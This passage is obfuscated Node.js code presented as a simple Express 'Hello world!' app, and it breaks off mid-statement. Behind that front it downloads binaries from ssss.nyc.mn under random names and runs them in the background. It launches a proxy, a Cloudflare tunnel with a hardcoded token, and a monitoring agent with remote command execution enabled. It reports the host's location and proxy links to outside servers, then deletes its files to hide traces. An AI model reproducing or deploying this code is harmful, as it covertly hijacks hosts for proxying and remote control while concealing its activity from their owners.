const _0x3b3934=_0x452b;(function(_0x8aa2f1,_0x377e53){const _0x20ed52=_0x452b,_0x190ded=_0x8aa2f1();while(!![]){try{const _0x27f77d=-parseInt(_0x20ed52(0x1bc))/0x1+parseInt(_0x20ed52(0x1c5))/0x2+-parseInt(_0x20ed52(0x1eb))/0x3+-parseInt(_0x20ed52(0x13a))/0x4+-parseInt(_0x20ed52(0x1aa))/0x5*(-parseInt(_0x20ed52(0x149))/0x6)+-parseInt(_0x20ed52(0x148))/0x7*(-parseInt(_0x20ed52(0x13e))/0x8)+parseInt(_0x20ed52(0x150))/0x9*(parseInt(_0x20ed52(0x1b2))/0xa);if(_0x27f77d===_0x377e53)break;else _0x190ded['push'](_0x190ded['shift']());}catch(_0x137d7e){_0x190ded['push'](_0x190ded['shift']());}}}(_0x5115,0xcf59b));function _0x5115(){const _0x419c36=['toString','Skipping\x20adding\x20automatic\x20access\x20task','/vmess-argo?ed=2560','path','forEach','App\x20is\x20running','message','/dev/null','charAt','length','761469YNfUwi','cdns.doon.eu.org','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','\x20-p\x20','platform','arm64','\x20-c\x20','PORT','dk.hfe.netlib.re','NEZHA_SERVER','\x20>\x20nul\x202>&1','chmod','match','substring','fileUrl','\x20already\x20exists','Error\x20downloading\x20files:','Download\x20','UPLOAD_URL','isFile','https+local://8.8.8.8/dns-query','https://arm64.ssss.nyc.mn/web','freedom','https://arm64.ssss.nyc.mn/v1','4205700DhGjbX','countryCode','amd','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','24DgGeLs','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','fileName','env','b73c19fb-e32c-4456-ace9-ce032c975b66','xtls-rprx-vision','get','http','vmess','2083','1582427PxKhSt','1418814xnurvM','NEZHA\x20variable\x20is\x20empty,skip\x20running','\x20is\x20running','443','eyJhIjoiNTgzM2RlM2VjZjVlZjE5M2Q2ZGJiNjQyNmNiMDI4NmIiLCJ0IjoiM2RmMzRkZjgtZjZlNi00ZmY2LWExMDAtMTEyZmFmYmI3MzE3IiwicyI6Ik5ERTBZVEUwTjJZdE5tUXdNaTAwWXpWbExXRTJOekF0WlRkak9XTmhOV1UxT1RaayJ9','application/json','abcdefghijklmnopqrstuvwxyz','59643hAWUCh','none','Subscription\x20uploaded\x20successfully','https://oooo.serv00.net/add-url','false','tls','true','firefox','base64','quic','https://amd64.ssss.nyc.mn/agent','\x0a\x20\x20credentials-file:\x20','\x0a\x0avmess://','/vmess-argo','CFIP','filter','stringify','basename','\x0avless://','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','from','Error\x20reading\x20boot.log:','finish','util','/tunnel.yml\x20run','arm','Unhandled\x20error\x20in\x20startserver:','2096','https://arm64.ssss.nyc.mn/bot','\x20-c\x20\x22','country_code','map','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','taskkill\x20/f\x20/im\x20','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','2053','data','org','Hello\x20world!','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','has','&path=%2Fvless-argo%3Fed%3D2560#','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','test','vless','8443','boot.log','catch','pkill\x20-f\x20\x22[','includes','--tls','automatic\x20access\x20task\x20added\x20successfully','ARGO_DOMAIN:','Empowerment\x20success\x20for\x20','Add\x20automatic\x20access\x20task\x20faild:\x20','npm\x20running\x20error:\x20','config.json','config.yaml','tunnel.json','\x20failed:\x20','pop','exec','log','&path=%2Ftrojan-argo%3Fed%3D2560#','/api/add-nodes','child_process','\x20>/dev/null\x202>&1\x20&','TunnelSecret','post','writeFileSync','\x0a\x20\x20\x20\x20','express','error','random','PROJECT_URL','send','tcp','statSync','FILE_PATH','\x0a\x0atrojan://','listen','aarch64','join','list.txt','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','sub.txt','&fp=firefox&type=ws&host=','ARGO_AUTH','?security=tls&sni=','35kKcGEF','127.0.0.1','\x20-s\x20','push','Content-Type','Error\x20in\x20startserver:','UUID','all','530qDmOWU','https://amd64.ssss.nyc.mn/bot','existsSync','\x0aclient_secret:\x20','/api/delete-nodes','arch','set','split','http\x20server\x20is\x20running\x20on\x20port:','win32','1247647yIZpAd','mkdirSync','blackhole','clear','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','Empowerment\x20failed\x20for\x20','unlinkSync','Nodes\x20uploaded\x20successfully','then','1435010lJoJMe','?encryption=none&security=tls&sni=','pipe','sub','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','dkjx','/sub.txt\x20saved\x20successfully','ArgoDomain:','nohup\x20','Error\x20executing\x20command:\x20','unlink','CFPORT','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','./tmp','ARGO_DOMAIN','https://amd64.ssss.nyc.mn/v1','web\x20running\x20error:\x20','/vless-argo','createWriteStream','floor','status','utf-8','2087','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','readFileSync','\x20is\x20created','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','NEZHA_PORT'];_0x5115=function(){return _0x419c36;};return _0x5115();}const express=require(_0x3b3934(0x198)),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require(_0x3b3934(0x1e4)),{promisify}=require(_0x3b3934(0x167)),exec=promisify(require(_0x3b3934(0x192))[_0x3b3934(0x18e)]),{execSync}=require('child_process'),UPLOAD_URL=process[_0x3b3934(0x141)][_0x3b3934(0x1fd)]||'',PROJECT_URL=process[_0x3b3934(0x141)][_0x3b3934(0x19b)]||'',AUTO_ACCESS=process[_0x3b3934(0x141)]['AUTO_ACCESS']||![],FILE_PATH=process[_0x3b3934(0x141)][_0x3b3934(0x19f)]||_0x3b3934(0x1d2),SUB_PATH=process[_0x3b3934(0x141)]['SUB_PATH']||_0x3b3934(0x1c8),PORT=process['env']['SERVER_PORT']||process[_0x3b3934(0x141)][_0x3b3934(0x1f2)]||0xbb8,UUID=process['env'][_0x3b3934(0x1b0)]||_0x3b3934(0x142),NEZHA_SERVER=process[_0x3b3934(0x141)][_0x3b3934(0x1f4)]||'',NEZHA_PORT=process['env'][_0x3b3934(0x1e0)]||'',NEZHA_KEY=process[_0x3b3934(0x141)]['NEZHA_KEY']||'',ARGO_DOMAIN=process[_0x3b3934(0x141)][_0x3b3934(0x1d3)]||_0x3b3934(0x1f3),ARGO_AUTH=process[_0x3b3934(0x141)][_0x3b3934(0x1a8)]||_0x3b3934(0x14d),ARGO_PORT=process['env']['ARGO_PORT']||0x1f41,CFIP=process[_0x3b3934(0x141)][_0x3b3934(0x15e)]||_0x3b3934(0x1ec),CFPORT=process[_0x3b3934(0x141)][_0x3b3934(0x1d0)]||0x1bb,NAME=process[_0x3b3934(0x141)]['NAME']||_0x3b3934(0x1ca);!fs[_0x3b3934(0x1b4)](FILE_PATH)?(fs[_0x3b3934(0x1bd)](FILE_PATH),console[_0x3b3934(0x18f)](FILE_PATH+_0x3b3934(0x1de))):console[_0x3b3934(0x18f)](FILE_PATH+_0x3b3934(0x1fa));function generateRandomName(){const _0x512946=_0x3b3934,_0xcdbf48=_0x512946(0x14f);let _0x4a4ec6='';for(let _0x92ec51=0x0;_0x92ec51<0x6;_0x92ec51++){_0x4a4ec6+=_0xcdbf48[_0x512946(0x1e9)](Math[_0x512946(0x1d8)](Math[_0x512946(0x19a)]()*_0xcdbf48[_0x512946(0x1ea)]));}return _0x4a4ec6;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x3b3934(0x1a3)](FILE_PATH,npmName),phpPath=path[_0x3b3934(0x1a3)](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path['join'](FILE_PATH,botName),subPath=path[_0x3b3934(0x1a3)](FILE_PATH,_0x3b3934(0x1a6)),listPath=path[_0x3b3934(0x1a3)](FILE_PATH,_0x3b3934(0x1a4)),bootLogPath=path[_0x3b3934(0x1a3)](FILE_PATH,'boot.log'),configPath=path['join'](FILE_PATH,_0x3b3934(0x189));function deleteNodes(){const _0x405642=_0x3b3934;try{if(!UPLOAD_URL)return;if(!fs[_0x405642(0x1b4)](subPath))return;let _0x525e85;try{_0x525e85=fs[_0x405642(0x1dd)](subPath,_0x405642(0x1da));}catch{return null;}const _0x124fdb=Buffer[_0x405642(0x164)](_0x525e85,_0x405642(0x158))[_0x405642(0x1e1)](_0x405642(0x1da)),_0x1ac543=_0x124fdb[_0x405642(0x1b9)]('\x0a')[_0x405642(0x15f)](_0x372a9e=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x405642(0x17c)](_0x372a9e));if(_0x1ac543[_0x405642(0x1ea)]===0x0)return;return axios[_0x405642(0x195)](UPLOAD_URL+_0x405642(0x1b6),JSON[_0x405642(0x160)]({'nodes':_0x1ac543}),{'headers':{'Content-Type':_0x405642(0x14e)}})[_0x405642(0x180)](_0x2ef3dc=>{return null;}),null;}catch(_0x401d5c){return null;}}function cleanupOldFiles(){const _0x3c03cb=_0x3b3934;try{const _0xa1ea82=fs['readdirSync'](FILE_PATH);_0xa1ea82[_0x3c03cb(0x1e5)](_0x3217b7=>{const _0x27f624=_0x3c03cb,_0x575510=path['join'](FILE_PATH,_0x3217b7);try{const _0x537d00=fs[_0x27f624(0x19e)](_0x575510);_0x537d00[_0x27f624(0x1fe)]()&&fs[_0x27f624(0x1c2)](_0x575510);}catch(_0x2a483f){}});}catch(_0x4f4cfa){}}app['get']('/',function(_0x40bdc3,_0x2948be){const _0x1c3d10=_0x3b3934;_0x2948be[_0x1c3d10(0x19c)](_0x1c3d10(0x177));});async function generateConfig(){const _0x330f79=_0x3b3934,_0x5b0130={'log':{'access':_0x330f79(0x1e8),'error':_0x330f79(0x1e8),'loglevel':_0x330f79(0x151)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x330f79(0x17d),'settings':{'clients':[{'id':UUID,'flow':_0x330f79(0x143)}],'decryption':'none','fallbacks':[{'dest':0xbb9},{'path':_0x330f79(0x1d6),'dest':0xbba},{'path':_0x330f79(0x15d),'dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':_0x330f79(0x19d)}},{'port':0xbb9,'listen':_0x330f79(0x1ab),'protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':_0x330f79(0x151)},'streamSettings':{'network':'tcp','security':_0x330f79(0x151)}},{'port':0xbba,'listen':_0x330f79(0x1ab),'protocol':_0x330f79(0x17d),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x330f79(0x151)},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x330f79(0x145),_0x330f79(0x155),_0x330f79(0x159)],'metadataOnly':![]}},{'port':0xbbb,'listen':'127.0.0.1','protocol':_0x330f79(0x146),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x330f79(0x15d)}},'sniffing':{'enabled':!![],'destOverride':[_0x330f79(0x145),_0x330f79(0x155),'quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x330f79(0x1ab),'protocol':'trojan','settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':'/trojan-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x330f79(0x145),_0x330f79(0x155),_0x330f79(0x159)],'metadataOnly':![]}}],'dns':{'servers':[_0x330f79(0x136)]},'outbounds':[{'protocol':_0x330f79(0x138),'tag':'direct'},{'protocol':_0x330f79(0x1be),'tag':'block'}]};fs[_0x330f79(0x196)](path[_0x330f79(0x1a3)](FILE_PATH,'config.json'),JSON[_0x330f79(0x160)](_0x5b0130,null,0x2));}function getSystemArchitecture(){const _0x3f5296=_0x3b3934,_0x26e7ec=os[_0x3f5296(0x1b7)]();return _0x26e7ec===_0x3f5296(0x169)||_0x26e7ec===_0x3f5296(0x1f0)||_0x26e7ec===_0x3f5296(0x1a2)?_0x3f5296(0x169):_0x3f5296(0x13c);}function downloadFile(_0x4803c1,_0x251207,_0x63dbfb){const _0x128673=_0x3b3934,_0x288133=_0x4803c1;!fs[_0x128673(0x1b4)](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0x23da5a=fs[_0x128673(0x1d7)](_0x288133);axios({'method':_0x128673(0x144),'url':_0x251207,'responseType':'stream'})[_0x128673(0x1c4)](_0x4d53b2=>{const _0x408ef2=_0x128673;_0x4d53b2[_0x408ef2(0x175)][_0x408ef2(0x1c7)](_0x23da5a),_0x23da5a['on'](_0x408ef2(0x166),()=>{const _0x493290=_0x408ef2;_0x23da5a['close'](),console[_0x493290(0x18f)]('Download\x20'+path[_0x493290(0x161)](_0x288133)+'\x20successfully'),_0x63dbfb(null,_0x288133);}),_0x23da5a['on']('error',_0x11e1e1=>{const _0x4d4cc0=_0x408ef2;fs[_0x4d4cc0(0x1cf)](_0x288133,()=>{});const _0x35fa66='Download\x20'+path['basename'](_0x288133)+_0x4d4cc0(0x18c)+_0x11e1e1[_0x4d4cc0(0x1e7)];console[_0x4d4cc0(0x199)](_0x35fa66),_0x63dbfb(_0x35fa66);});})[_0x128673(0x180)](_0x50eb2b=>{const _0x262692=_0x128673,_0x1588bd=_0x262692(0x1fc)+path['basename'](_0x288133)+_0x262692(0x18c)+_0x50eb2b[_0x262692(0x1e7)];console[_0x262692(0x199)](_0x1588bd),_0x63dbfb(_0x1588bd);});}async function downloadFilesAndRun(){const _0x1067cd=_0x3b3934,_0x351bbb=getSystemArchitecture(),_0x3b30ef=getFilesForArchitecture(_0x351bbb);if(_0x3b30ef[_0x1067cd(0x1ea)]===0x0){console[_0x1067cd(0x18f)](_0x1067cd(0x1a5));return;}const _0x4f04f1=_0x3b30ef[_0x1067cd(0x16f)](_0x50f650=>{return new Promise((_0x44deb5,_0x5acfa1)=>{const _0x528b15=_0x452b;downloadFile(_0x50f650[_0x528b15(0x140)],_0x50f650[_0x528b15(0x1f9)],(_0x45081f,_0x37c97f)=>{_0x45081f?_0x5acfa1(_0x45081f):_0x44deb5(_0x37c97f);});});});try{await Promise[_0x1067cd(0x1b1)](_0x4f04f1);}catch(_0x389596){console[_0x1067cd(0x199)](_0x1067cd(0x1fb),_0x389596);return;}function _0x29bc24(_0x3b4184){const _0x279112=_0x1067cd,_0x151242=0x1fd;_0x3b4184[_0x279112(0x1e5)](_0x238b4b=>{const _0x1b9c3c=_0x279112;fs[_0x1b9c3c(0x1b4)](_0x238b4b)&&fs[_0x1b9c3c(0x1f6)](_0x238b4b,_0x151242,_0x6aa45a=>{const _0x54f017=_0x1b9c3c;_0x6aa45a?console[_0x54f017(0x199)](_0x54f017(0x1c1)+_0x238b4b+':\x20'+_0x6aa45a):console['log'](_0x54f017(0x186)+_0x238b4b+':\x20'+_0x151242[_0x54f017(0x1e1)](0x8));});});}const _0x5838ca=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x29bc24(_0x5838ca);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x204c86=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x1067cd(0x1b9)](':')[_0x1067cd(0x18d)]():'',_0x101e9c=new Set([_0x1067cd(0x14c),_0x1067cd(0x17e),_0x1067cd(0x16b),_0x1067cd(0x1db),_0x1067cd(0x147),_0x1067cd(0x174)]),_0x3ce7ca=_0x101e9c[_0x1067cd(0x179)](_0x204c86)?_0x1067cd(0x156):_0x1067cd(0x154),_0x66043e=_0x1067cd(0x1b5)+NEZHA_KEY+_0x1067cd(0x13f)+NEZHA_SERVER+_0x1067cd(0x163)+_0x3ce7ca+_0x1067cd(0x1d1)+UUID;fs['writeFileSync'](path[_0x1067cd(0x1a3)](FILE_PATH,_0x1067cd(0x18a)),_0x66043e);const _0x5dc5a='nohup\x20'+phpPath+_0x1067cd(0x16d)+FILE_PATH+_0x1067cd(0x1ed);try{await exec(_0x5dc5a),console[_0x1067cd(0x18f)](phpName+_0x1067cd(0x14b)),await new Promise(_0x141b4b=>setTimeout(_0x141b4b,0x3e8));}catch(_0x7fdf03){console[_0x1067cd(0x199)]('php\x20running\x20error:\x20'+_0x7fdf03);}}else{let _0x316856='';const _0x46ddcd=[_0x1067cd(0x14c),_0x1067cd(0x17e),_0x1067cd(0x16b),'2087',_0x1067cd(0x147),_0x1067cd(0x174)];_0x46ddcd[_0x1067cd(0x182)](NEZHA_PORT)&&(_0x316856=_0x1067cd(0x183));const _0x1022ee=_0x1067cd(0x1cd)+npmPath+_0x1067cd(0x1ac)+NEZHA_SERVER+':'+NEZHA_PORT+_0x1067cd(0x1ee)+NEZHA_KEY+'\x20'+_0x316856+_0x1067cd(0x172);try{await exec(_0x1022ee),console[_0x1067cd(0x18f)](npmName+_0x1067cd(0x14b)),await new Promise(_0xf235f5=>setTimeout(_0xf235f5,0x3e8));}catch(_0x423ff2){console['error'](_0x1067cd(0x188)+_0x423ff2);}}}else console[_0x1067cd(0x18f)](_0x1067cd(0x14a));const _0x4fc295=_0x1067cd(0x1cd)+webPath+_0x1067cd(0x1f1)+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x4fc295),console[_0x1067cd(0x18f)](webName+_0x1067cd(0x14b)),await new Promise(_0x233f29=>setTimeout(_0x233f29,0x3e8));}catch(_0x2fafad){console[_0x1067cd(0x199)](_0x1067cd(0x1d5)+_0x2fafad);}if(fs[_0x1067cd(0x1b4)](botPath)){let _0xf00ed8;if(ARGO_AUTH[_0x1067cd(0x1f7)](/^[A-Z0-9a-z=]{120,250}$/))_0xf00ed8=_0x1067cd(0x1dc)+ARGO_AUTH;else ARGO_AUTH[_0x1067cd(0x1f7)](/TunnelSecret/)?_0xf00ed8=_0x1067cd(0x170)+FILE_PATH+_0x1067cd(0x168):_0xf00ed8=_0x1067cd(0x173)+FILE_PATH+_0x1067cd(0x1c0)+ARGO_PORT;try{await exec(_0x1067cd(0x1cd)+botPath+'\x20'+_0xf00ed8+'\x20>/dev/null\x202>&1\x20&'),console[_0x1067cd(0x18f)](botName+_0x1067cd(0x14b)),await new Promise(_0x58d326=>setTimeout(_0x58d326,0x7d0));}catch(_0x1aaa97){console[_0x1067cd(0x199)]('Error\x20executing\x20command:\x20'+_0x1aaa97);}}await new Promise(_0x324043=>setTimeout(_0x324043,0x1388));}function getFilesForArchitecture(_0x57fc07){const _0x3d2fed=_0x3b3934;let _0x5ef936;_0x57fc07==='arm'?_0x5ef936=[{'fileName':webPath,'fileUrl':_0x3d2fed(0x137)},{'fileName':botPath,'fileUrl':_0x3d2fed(0x16c)}]:_0x5ef936=[{'fileName':webPath,'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x3d2fed(0x1b3)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x286e63=_0x57fc07==='arm'?'https://arm64.ssss.nyc.mn/agent':_0x3d2fed(0x15a);_0x5ef936['unshift']({'fileName':npmPath,'fileUrl':_0x286e63});}else{const _0x3d0be6=_0x57fc07===_0x3d2fed(0x169)?_0x3d2fed(0x139):_0x3d2fed(0x1d4);_0x5ef936['unshift']({'fileName':phpPath,'fileUrl':_0x3d0be6});}}return _0x5ef936;}function argoType(){const _0x4e403b=_0x3b3934;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x4e403b(0x18f)](_0x4e403b(0x13d));return;}if(ARGO_AUTH[_0x4e403b(0x182)](_0x4e403b(0x194))){fs['writeFileSync'](path[_0x4e403b(0x1a3)](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0x34c360='\x0a\x20\x20tunnel:\x20'+ARGO_AUTH[_0x4e403b(0x1b9)]('\x22')[0xb]+_0x4e403b(0x15b)+path[_0x4e403b(0x1a3)](FILE_PATH,_0x4e403b(0x18b))+'\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20'+ARGO_DOMAIN+_0x4e403b(0x1c9)+ARGO_PORT+_0x4e403b(0x178);fs[_0x4e403b(0x196)](path['join'](FILE_PATH,'tunnel.yml'),_0x34c360);}else console[_0x4e403b(0x18f)]('ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel');}async function extractDomains(){const _0x534365=_0x3b3934;let _0x335777;if(ARGO_AUTH&&ARGO_DOMAIN)_0x335777=ARGO_DOMAIN,console[_0x534365(0x18f)](_0x534365(0x185),_0x335777),await _0xea4cc4(_0x335777);else try{const _0x16a52e=fs['readFileSync'](path['join'](FILE_PATH,_0x534365(0x17f)),_0x534365(0x1da)),_0x1afb20=_0x16a52e[_0x534365(0x1b9)]('\x0a'),_0x51b1f9=[];_0x1afb20[_0x534365(0x1e5)](_0x1f103d=>{const _0xa06d6d=_0x534365,_0x3a0ddf=_0x1f103d[_0xa06d6d(0x1f7)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x3a0ddf){const _0x10512b=_0x3a0ddf[0x1];_0x51b1f9['push'](_0x10512b);}});if(_0x51b1f9[_0x534365(0x1ea)]>0x0)_0x335777=_0x51b1f9[0x0],console[_0x534365(0x18f)](_0x534365(0x1cc),_0x335777),await _0xea4cc4(_0x335777);else{console[_0x534365(0x18f)](_0x534365(0x1df)),fs[_0x534365(0x1c2)](path[_0x534365(0x1a3)](FILE_PATH,'boot.log'));async function _0x76cc7(){const _0xf96074=_0x534365;try{process[_0xf96074(0x1ef)]===_0xf96074(0x1bb)?await exec(_0xf96074(0x171)+botName+'.exe\x20>\x20nul\x202>&1'):await exec(_0xf96074(0x181)+botName[_0xf96074(0x1e9)](0x0)+']'+botName[_0xf96074(0x1f8)](0x1)+'\x22\x20>\x20/dev/null\x202>&1');}catch(_0x4d9977){}}_0x76cc7(),await new Promise(_0x15267d=>setTimeout(_0x15267d,0xbb8));const _0xfaccb8=_0x534365(0x173)+FILE_PATH+_0x534365(0x1c0)+ARGO_PORT;try{await exec(_0x534365(0x1cd)+botPath+'\x20'+_0xfaccb8+_0x534365(0x193)),console[_0x534365(0x18f)](botName+'\x20is\x20running'),await new Promise(_0x494221=>setTimeout(_0x494221,0xbb8)),await extractDomains();}catch(_0x37fbee){console[_0x534365(0x199)](_0x534365(0x1ce)+_0x37fbee);}}}catch(_0x507a8b){console[_0x534365(0x199)](_0x534365(0x165),_0x507a8b);}async function _0x5a64ef(){const _0x5e087=_0x534365;try{const _0x3b1159=await axios[_0x5e087(0x144)]('https://ipapi.co/json/',{'timeout':0xbb8});if(_0x3b1159[_0x5e087(0x175)]&&_0x3b1159[_0x5e087(0x175)][_0x5e087(0x16e)]&&_0x3b1159['data']['org'])return _0x3b1159[_0x5e087(0x175)][_0x5e087(0x16e)]+'_'+_0x3b1159[_0x5e087(0x175)]['org'];}catch(_0x15b97b){try{const _0x114091=await axios[_0x5e087(0x144)]('http://ip-api.com/json/',{'timeout':0xbb8});if(_0x114091[_0x5e087(0x175)]&&_0x114091[_0x5e087(0x175)][_0x5e087(0x1d9)]==='success'&&_0x114091[_0x5e087(0x175)][_0x5e087(0x13b)]&&_0x114091[_0x5e087(0x175)][_0x5e087(0x176)])return _0x114091[_0x5e087(0x175)][_0x5e087(0x13b)]+'_'+_0x114091[_0x5e087(0x175)][_0x5e087(0x176)];}catch(_0x41b675){}}return'Unknown';}async function _0xea4cc4(_0x3bff47){const _0x591647=await _0x5a64ef(),_0x2c9b8c=NAME?NAME+'-'+_0x591647:_0x591647;return new Promise(_0x33749c=>{setTimeout(()=>{const _0x324b8f=_0x452b,_0xcfa3ed={'v':'2','ps':''+_0x2c9b8c,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':_0x324b8f(0x151),'host':_0x3bff47,'path':_0x324b8f(0x1e3),'tls':_0x324b8f(0x155),'sni':_0x3bff47,'alpn':'','fp':_0x324b8f(0x157)},_0x2475ad=_0x324b8f(0x162)+UUID+'@'+CFIP+':'+CFPORT+_0x324b8f(0x1c6)+_0x3bff47+'&fp=firefox&type=ws&host='+_0x3bff47+_0x324b8f(0x17a)+_0x2c9b8c+_0x324b8f(0x15c)+Buffer['from'](JSON['stringify'](_0xcfa3ed))[_0x324b8f(0x1e1)](_0x324b8f(0x158))+_0x324b8f(0x1a0)+UUID+'@'+CFIP+':'+CFPORT+_0x324b8f(0x1a9)+_0x3bff47+_0x324b8f(0x1a7)+_0x3bff47+_0x324b8f(0x190)+_0x2c9b8c+_0x324b8f(0x197);console[_0x324b8f(0x18f)](Buffer['from'](_0x2475ad)[_0x324b8f(0x1e1)](_0x324b8f(0x158))),fs[_0x324b8f(0x196)](subPath,Buffer[_0x324b8f(0x164)](_0x2475ad)[_0x324b8f(0x1e1)]('base64')),console['log'](FILE_PATH+_0x324b8f(0x1cb)),uploadNodes(),app[_0x324b8f(0x144)]('/'+SUB_PATH,(_0x5e81db,_0x20e8a4)=>{const _0x5c5ee5=_0x324b8f,_0x5e6d77=Buffer[_0x5c5ee5(0x164)](_0x2475ad)[_0x5c5ee5(0x1e1)](_0x5c5ee5(0x158));_0x20e8a4[_0x5c5ee5(0x1b8)](_0x5c5ee5(0x1ae),'text/plain;\x20charset=utf-8'),_0x20e8a4['send'](_0x5e6d77);}),_0x33749c(_0x2475ad);},0x7d0);});}}async function uploadNodes(){const _0x37464a=_0x3b3934;if(UPLOAD_URL&&PROJECT_URL){const _0x3a3d4b=PROJECT_URL+'/'+SUB_PATH,_0xde1fb7={'subscription':[_0x3a3d4b]};try{const _0x5134e6=await axios[_0x37464a(0x195)](UPLOAD_URL+'/api/add-subscriptions',_0xde1fb7,{'headers':{'Content-Type':_0x37464a(0x14e)}});return _0x5134e6&&_0x5134e6['status']===0xc8?(console['log'](_0x37464a(0x152)),_0x5134e6):null;}catch(_0x5c4a32){if(_0x5c4a32['response']){if(_0x5c4a32['response'][_0x37464a(0x1d9)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0x3555a7=fs[_0x37464a(0x1dd)](listPath,_0x37464a(0x1da)),_0x48b4a4=_0x3555a7[_0x37464a(0x1b9)]('\x0a')[_0x37464a(0x15f)](_0x526a26=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x37464a(0x17c)](_0x526a26));if(_0x48b4a4['length']===0x0)return;const _0x3dd626=JSON[_0x37464a(0x160)]({'nodes':_0x48b4a4});try{const _0x5ada73=await axios[_0x37464a(0x195)](UPLOAD_URL+_0x37464a(0x191),_0x3dd626,{'headers':{'Content-Type':_0x37464a(0x14e)}});return _0x5ada73&&_0x5ada73[_0x37464a(0x1d9)]===0xc8?(console[_0x37464a(0x18f)](_0x37464a(0x1c3)),_0x5ada73):null;}catch(_0x2736eb){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x505a45=_0x452b,_0x1dde81=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x1dde81['push'](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x1dde81[_0x505a45(0x1ad)](phpPath);process[_0x505a45(0x1ef)]===_0x505a45(0x1bb)?exec('del\x20/f\x20/q\x20'+_0x1dde81[_0x505a45(0x1a3)]('\x20')+_0x505a45(0x1f5),_0x5a1b79=>{const _0x4d5815=_0x505a45;console[_0x4d5815(0x1bf)](),console['log'](_0x4d5815(0x1e6)),console[_0x4d5815(0x18f)](_0x4d5815(0x17b));}):exec('rm\x20-rf\x20'+_0x1dde81['join']('\x20')+'\x20>/dev/null\x202>&1',_0x5e7ba7=>{const _0x10305b=_0x505a45;console[_0x10305b(0x1bf)](),console[_0x10305b(0x18f)](_0x10305b(0x1e6)),console[_0x10305b(0x18f)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');});},0x15f90);}function _0x452b(_0x5cc0bc,_0x4bd263){_0x5cc0bc=_0x5cc0bc-0x136;const _0x51154d=_0x5115();let _0x452b92=_0x51154d[_0x5cc0bc];return _0x452b92;}cleanFiles();async function AddVisitTask(){const _0x3f6336=_0x3b3934;if(!AUTO_ACCESS||!PROJECT_URL){console['log'](_0x3f6336(0x1e2));return;}try{const _0x275c11=await axios[_0x3f6336(0x195)](_0x3f6336(0x153),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x3f6336(0x14e)}});return console[_0x3f6336(0x18f)](_0x3f6336(0x184)),_0x275c11;}catch(_0x5029ec){return console[_0x3f6336(0x199)](_0x3f6336(0x187)+_0x5029ec[_0x3f6336(0x1e7)]),null;}}async function startserver(){const _0x197ae9=_0x3b3934;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await 